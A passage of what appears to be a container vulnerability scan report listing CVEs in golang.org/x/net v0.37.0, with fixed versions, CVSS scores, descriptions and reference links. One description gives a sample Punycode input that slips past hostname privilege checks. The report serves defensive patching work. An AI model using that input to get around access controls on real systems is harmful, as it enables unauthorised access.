│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:33120 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33123 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:33142 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:34342 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [10]: https://access.redhat.com/security/cve/CVE-2026-33814 
│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
│     │      │                  ├ [12]: https://github.com/golang/go/issues/78476 
│     │      │                  ├ [13]: https://go-review.googlesource.com/c/go/+/761581 
│     │      │                  ├ [14]: https://go-review.googlesource.com/c/net/+/761640 
│     │      │                  ├ [15]: https://go.dev/cl/761581 
│     │      │                  ├ [16]: https://go.dev/cl/761640 
│     │      │                  ├ [17]: https://go.dev/issue/78476 
│     │      │                  ├ [18]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ├ [19]: https://linux.oracle.com/cve/CVE-2026-33814.html 
│     │      │                  ├ [20]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
│     │      │                  ├ [21]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
│     │      │                  ├ [22]: https://pkg.go.dev/vuln/GO-2026-4918 
│     │      │                  ├ [23]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-33814
│     │      │                  │       .json 
│     │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8430-1 
│     │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8471-1 
│     │      │                  ├ [26]: https://ubuntu.com/security/notices/USN-8472-1 
│     │      │                  ├ [27]: https://ubuntu.com/security/notices/USN-8473-1 
│     │      │                  ╰ [28]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
│     │      ╰ LastModifiedDate: 2026-07-24T13:18:01.21Z 
│     ├ [11] ╭ VulnerabilityID : CVE-2026-39821 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5026 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39821 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:d44aeecabe2798f853578c8bd0ee8fac6a24ad12d715afe16698f6939251117c 
│     │      ├ Title           : golang.org/x/net/idna: golang: net/http: golang.org/x/net/idna: Privilege
│     │      │                   escalation via incorrect Punycode label processing 
│     │      ├ Description     : The ToASCII and ToUnicode functions incorrectly accept Punycode-encoded labels
│     │      │                    that decode to an ASCII-only label. For example,
│     │      │                   ToUnicode("xn--example-.com") incorrectly returns the name "example.com"
│     │      │                   rather than an error. This behavior can lead to privilege escalation in
│     │      │                   programs using the idna package. For example, a program which performs
│     │      │                   privilege checks on the ASCII hostname may reject "example.com" but permit
│     │      │                   "xn--example-.com". If that program subsequently converts the ASCII hostname
│     │      │                   to Unicode, it will inadvertently permits access to the Unicode name
│     │      │                   "example.com". 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-1289 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 4 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ├ rocky      : 3 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.2 
│     │      ├ References       ╭ [0]  : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1]  : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2]  : https://access.redhat.com/errata/RHSA-2026:26546 
│     │      │                  ├ [3]  : https://access.redhat.com/errata/RHSA-2026:26547 
│     │      │                  ├ [4]  : https://access.redhat.com/errata/RHSA-2026:30650 
│     │      │                  ├ [5]  : https://access.redhat.com/errata/RHSA-2026:30651 
│     │      │                  ├ [6]  : https://access.redhat.com/errata/RHSA-2026:30853 
│     │      │                  ├ [7]  : https://access.redhat.com/errata/RHSA-2026:30854 
│     │      │                  ├ [8]  : https://access.redhat.com/errata/RHSA-2026:30855 
│     │      │                  ├ [9]  : https://access.redhat.com/errata/RHSA-2026:33155 
│     │      │                  ├ [10] : https://access.redhat.com/errata/RHSA-2026:33160 
│     │      │                  ├ [11] : https://access.redhat.com/errata/RHSA-2026:33163 
│     │      │                  ├ [12] : https://access.redhat.com/errata/RHSA-2026:33173 
│     │      │                  ├ [13] : https://access.redhat.com/errata/RHSA-2026:33183 
│     │      │                  ├ [14] : https://access.redhat.com/errata/RHSA-2026:33524 
│     │      │                  ├ [15] : https://access.redhat.com/errata/RHSA-2026:33531 
│     │      │                  ├ [16] : https://access.redhat.com/errata/RHSA-2026:34342 
│     │      │                  ├ [17] : https://access.redhat.com/errata/RHSA-2026:34357 
│     │      │                  ├ [18] : https://access.redhat.com/errata/RHSA-2026:34359 
│     │      │                  ├ [19] : https://access.redhat.com/errata/RHSA-2026:34364 
│     │      │                  ├ [20] : https://access.redhat.com/errata/RHSA-2026:34789 
│     │      │                  ├ [21] : https://access.redhat.com/errata/RHSA-2026:35826 
│     │      │                  ├ [22] : https://access.redhat.com/errata/RHSA-2026:35827 
│     │      │                  ├ [23] : https://access.redhat.com/errata/RHSA-2026:35828 
│     │      │                  ├ [24] : https://access.redhat.com/errata/RHSA-2026:35829 
│     │      │                  ├ [25] : https://access.redhat.com/errata/RHSA-2026:35830 
│     │      │                  ├ [26] : https://access.redhat.com/errata/RHSA-2026:35831 
│     │      │                  ├ [27] : https://access.redhat.com/errata/RHSA-2026:35993 
│     │      │                  ├ [28] : https://access.redhat.com/errata/RHSA-2026:35994 
│     │      │                  ├ [29] : https://access.redhat.com/errata/RHSA-2026:36105 
│     │      │                  ├ [30] : https://access.redhat.com/errata/RHSA-2026:36167 
│     │      │                  ├ [31] : https://access.redhat.com/errata/RHSA-2026:36207 
│     │      │                  ├ [32] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [33] : https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [34] : https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [35] : https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [36] : https://access.redhat.com/errata/RHSA-2026:36808 
│     │      │                  ├ [37] : https://access.redhat.com/errata/RHSA-2026:36820 
│     │      │                  ├ [38] : https://access.redhat.com/errata/RHSA-2026:36883 
│     │      │                  ├ [39] : https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [40] : https://access.redhat.com/errata/RHSA-2026:37435 
│     │      │                  ├ [41] : https://access.redhat.com/errata/RHSA-2026:37436 
│     │      │                  ├ [42] : https://access.redhat.com/errata/RHSA-2026:38995 
│     │      │                  ├ [43] : https://access.redhat.com/errata/RHSA-2026:39005 
│     │      │                  ├ [44] : https://access.redhat.com/errata/RHSA-2026:39573 
│     │      │                  ├ [45] : https://access.redhat.com/errata/RHSA-2026:39879 
│     │      │                  ├ [46] : https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [47] : https://access.redhat.com/errata/RHSA-2026:40262 
│     │      │                  ├ [48] : https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [49] : https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [50] : https://access.redhat.com/errata/RHSA-2026:41030 
│     │      │                  ├ [51] : https://access.redhat.com/errata/RHSA-2026:41031 
│     │      │                  ├ [52] : https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [53] : https://access.redhat.com/errata/RHSA-2026:41055 
│     │      │                  ├ [54] : https://access.redhat.com/errata/RHSA-2026:41066 
│     │      │                  ├ [55] : https://access.redhat.com/errata/RHSA-2026:41928 
│     │      │                  ├ [56] : https://access.redhat.com/errata/RHSA-2026:41930 
│     │      │                  ├ [57] : https://access.redhat.com/errata/RHSA-2026:42043 
│     │      │                  ├ [58] : https://access.redhat.com/errata/RHSA-2026:42047 
│     │      │                  ├ [59] : https://access.redhat.com/errata/RHSA-2026:42048 
│     │      │                  ├ [60] : https://access.redhat.com/errata/RHSA-2026:42049 
│     │      │                  ├ [61] : https://access.redhat.com/errata/RHSA-2026:42050 
│     │      │                  ├ [62] : https://access.redhat.com/errata/RHSA-2026:42051 
│     │      │                  ├ [63] : https://access.redhat.com/errata/RHSA-2026:42078 
│     │      │                  ├ [64] : https://access.redhat.com/errata/RHSA-2026:42079 
│     │      │                  ├ [65] : https://access.redhat.com/errata/RHSA-2026:42080 
│     │      │                  ├ [66] : https://access.redhat.com/errata/RHSA-2026:42082 
│     │      │                  ├ [67] : https://access.redhat.com/errata/RHSA-2026:42132 
│     │      │                  ├ [68] : https://access.redhat.com/errata/RHSA-2026:42142 
│     │      │                  ├ [69] : https://access.redhat.com/errata/RHSA-2026:42146 
│     │      │                  ├ [70] : https://access.redhat.com/errata/RHSA-2026:42150 
│     │      │                  ├ [71] : https://access.redhat.com/errata/RHSA-2026:42151 
│     │      │                  ├ [72] : https://access.redhat.com/errata/RHSA-2026:42240 
│     │      │                  ├ [73] : https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [74] : https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [75] : https://access.redhat.com/errata/RHSA-2026:42852 
│     │      │                  ├ [76] : https://access.redhat.com/errata/RHSA-2026:43038 
│     │      │                  ├ [77] : https://access.redhat.com/errata/RHSA-2026:43052 
│     │      │                  ├ [78] : https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [79] : https://access.redhat.com/errata/RHSA-2026:44622 
│     │      │                  ├ [80] : https://access.redhat.com/errata/RHSA-2026:44624 
│     │      │                  ├ [81] : https://access.redhat.com/errata/RHSA-2026:46395 
│     │      │                  ├ [82] : https://access.redhat.com/security/cve/CVE-2026-39821 
│     │      │                  ├ [83] : https://bugzilla.redhat.com/2480756 
│     │      │                  ├ [84] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
│     │      │                  ├ [85] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│     │      │                  ├ [86] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
│     │      │                  ├ [87] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
│     │      │                  ├ [88] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
│     │      │                  ├ [89] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
│     │      │                  ├ [90] : https://errata.almalinux.org/9/ALSA-2026-37435.html 
│     │      │                  ├ [91] : https://errata.rockylinux.org/RLSA-2026:38995 
│     │      │                  ├ [92] : https://github.com/golang/go/issues/78760 
│     │      │                  ├ [93] : https://go.dev/cl/767220 
│     │      │                  ├ [94] : https://go.dev/issue/78760 
│     │      │                  ├ [95] : https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [96] : https://linux.oracle.com/cve/CVE-2026-39821.html 
│     │      │                  ├ [97] : https://linux.oracle.com/errata/ELSA-2026-39573.html 
│     │      │                  ├ [98] : https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
│     │      │                  ├ [99] : https://pkg.go.dev/vuln/GO-2026-5026 
│     │      │                  ├ [100]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-3982
│     │      │                  │        1.json 
│     │      │                  ├ [101]: https://ubuntu.com/security/notices/USN-8416-1 
│     │      │                  ╰ [102]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.41Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:46.25Z 
│     ├ [12] ╭ VulnerabilityID : CVE-2025-22872 
│     │      ├ VendorIDs        ─ [0]: GO-2025-3595 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.38.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-22872 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:2285c04d8ac479dffbd9b2b89da3e05757311219624f53ca622b94f9f7a9b594 
│     │      ├ Title           : golang.org/x/net/html: Incorrect Neutralization of Input During Web Page
│     │      │                   Generation in x/net in golang.org/x/net 
│     │      ├ Description     : The tokenizer incorrectly interprets tags with unquoted attribute values that
│     │      │                   end with a solidus character (/) as self-closing. When directly using
│     │      │                   Tokenizer, this can result in such tags incorrectly being marked as
│     │      │                   self-closing, and when using the Parse functions, this can result in content
│     │      │                   following such tags as being placed in the wrong scope during DOM
│     │      │                   construction, but only when tags are in foreign content (e.g. <math>, <svg>,
│     │      │                   etc contexts). 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ╭ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ cbl-mariner: 2 
│     │      │                  ├ redhat     : 2 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L 
│     │      │                           ╰ V3Score : 6.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2025-22872 
│     │      │                  ├ [1] : https://github.com/TheDegenerateDev5150/net/commit/e1fcd82abba34df74614
│     │      │                  │       020343be8eb1fe85f0d9 
│     │      │                  ├ [2] : https://github.com/advisories/GHSA-vvgc-356p-c3xw 
│     │      │                  ├ [3] : https://go.dev/cl/662715 
│     │      │                  ├ [4] : https://go.dev/issue/73070 
│     │      │                  ├ [5] : https://groups.google.com/g/golang-announce/c/ezSKR9vqbqA 
│     │      │                  ├ [6] : https://nvd.nist.gov/vuln/detail/CVE-2025-22872 
│     │      │                  ├ [7] : https://pkg.go.dev/vuln/GO-2025-3595 
│     │      │                  ├ [8] : https://security.netapp.com/advisory/ntap-20250516-0007/ 
│     │      │                  ├ [9] : https://ubuntu.com/security/notices/USN-8089-1 
│     │      │                  ├ [10]: https://ubuntu.com/security/notices/USN-8089-2 
│     │      │                  ├ [11]: https://ubuntu.com/security/notices/USN-8089-3 
│     │      │                  ╰ [12]: https://www.cve.org/CVERecord?id=CVE-2025-22872 
│     │      ├ PublishedDate   : 2025-04-16T18:16:04.183Z 
│     │      ╰ LastModifiedDate: 2026-06-17T08:50:41.693Z 
│     ├ [13] ╭ VulnerabilityID : CVE-2025-47911 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4440 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.45.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-47911 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:e62bf324f11d9ea6d7726c4b5304278d291a489650b163bd055b9bdac356178e 
│     │      ├ Title           : golang.org/x/net/html: Quadratic parsing complexity in golang.org/x/net/html 
│     │      ├ Description     : The html.Parse function in golang.org/x/net/html has quadratic parsing
│     │      │                   complexity when processing certain inputs, which can lead to denial of service
│     │      │                    (DoS) if an attacker provides specially crafted HTML content. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ╭ amazon     : 2 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ cbl-mariner: 2 
│     │      │                  ├ nvd        : 2 
│     │      │                  ├ redhat     : 2 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ╭ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│     │      │                  │        ╰ V3Score : 5.3 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│     │      │                           ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2025-47911 
│     │      │                  ├ [1] : https://github.com/golang/go/issues/75682 
│     │      │                  ├ [2] : https://github.com/golang/vulndb/issues/4440 
│     │      │                  ├ [3] : https://go.dev/cl/709876 
│     │      │                  ├ [4] : https://groups.google.com/g/golang-announce/c/jnQcOYpiR2c 
│     │      │                  ├ [5] : https://nvd.nist.gov/vuln/detail/CVE-2025-47911 
│     │      │                  ├ [6] : https://pkg.go.dev/vuln/GO-2026-4440 
│     │      │                  ├ [7] : https://ubuntu.com/security/notices/USN-8089-1 
│     │      │                  ├ [8] : https://ubuntu.com/security/notices/USN-8089-2 
│     │      │                  ├ [9] : https://ubuntu.com/security/notices/USN-8089-3 
│     │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2025-47911 
│     │      ├ PublishedDate   : 2026-02-05T18:16:09.893Z 
│     │      ╰ LastModifiedDate: 2026-06-17T09:28:50.07Z 
│     ├ [14] ╭ VulnerabilityID : CVE-2025-58190 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4441 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.45.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58190 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:7a822181b07929f4c8381de32b7eb096b24982d08573b46bfb8a75dd15dd9402 
│     │      ├ Title           : golang.org/x/net/html: Infinite parsing loop in golang.org/x/net 
│     │      ├ Description     : The html.Parse function in golang.org/x/net/html has an infinite parsing loop
│     │      │                   when processing certain inputs, which can lead to denial of service (DoS) if
│     │      │                   an attacker provides specially crafted HTML content. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-835 
│     │      ├ VendorSeverity   ╭ amazon     : 2 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ cbl-mariner: 2 
│     │      │                  ├ nvd        : 2 
│     │      │                  ├ redhat     : 2 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ╭ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│     │      │                  │        ╰ V3Score : 5.3 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L 
│     │      │                           ╰ V3Score : 4.3 
│     │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2025-58190 
│     │      │                  ├ [1] : https://github.com/golang/go/issues/70179 
│     │      │                  ├ [2] : https://github.com/golang/vulndb/issues/4441 
│     │      │                  ├ [3] : https://go.dev/cl/709875 
│     │      │                  ├ [4] : https://groups.google.com/g/golang-announce/c/jnQcOYpiR2c 
│     │      │                  ├ [5] : https://nvd.nist.gov/vuln/detail/CVE-2025-58190 
│     │      │                  ├ [6] : https://pkg.go.dev/vuln/GO-2026-4441 
│     │      │                  ├ [7] : https://ubuntu.com/security/notices/USN-8089-1 
│     │      │                  ├ [8] : https://ubuntu.com/security/notices/USN-8089-2 
│     │      │                  ├ [9] : https://ubuntu.com/security/notices/USN-8089-3 
│     │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2025-58190 
│     │      ├ PublishedDate   : 2026-02-05T18:16:10.027Z 
│     │      ╰ LastModifiedDate: 2026-06-17T09:44:02.557Z 
│     ├ [15] ╭ VulnerabilityID : CVE-2026-25680 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5028 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25680 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:9bdaf4d9536d8f39eee8ad9b9c0a76e4d49139195403dcb67ad09d9ba814dd00 
│     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Denial of Service due to
│     │      │                   excessive HTML parsing 
│     │      ├ Description     : Parsing arbitrary HTML can consume excessive CPU time, possibly leading to
│     │      │                   denial of service. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-400 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 6.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-25680 
│     │      │                  ├ [1]: https://go.dev/cl/781702 
│     │      │                  ├ [2]: https://go.dev/issue/79573 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-25680 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5028 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-25680 
│     │      ├ PublishedDate   : 2026-05-22T16:16:19.753Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [16] ╭ VulnerabilityID : CVE-2026-42502 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5027 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42502 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:f6df53e57b58695d795344376291187c580440065e9ec382e8ca2ef3095cbdce 
│     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
│     │      │                    unexpected HTML tree rendering 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-1021 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                           ╰ V3Score : 6.1 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42502 
│     │      │                  ├ [1]: https://go.dev/cl/781701 
│     │      │                  ├ [2]: https://go.dev/issue/79572 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42502 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5027 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42502 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.587Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [17] ╭ VulnerabilityID : CVE-2026-42506 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5025 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42506 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:68015ac3bcc79274600c13ab6fee122d4bfb44f4bf50fff2591ad5bbfe076f32 
│     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Cross-Site Scripting (XSS) via
│     │      │                   arbitrary HTML parsing 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
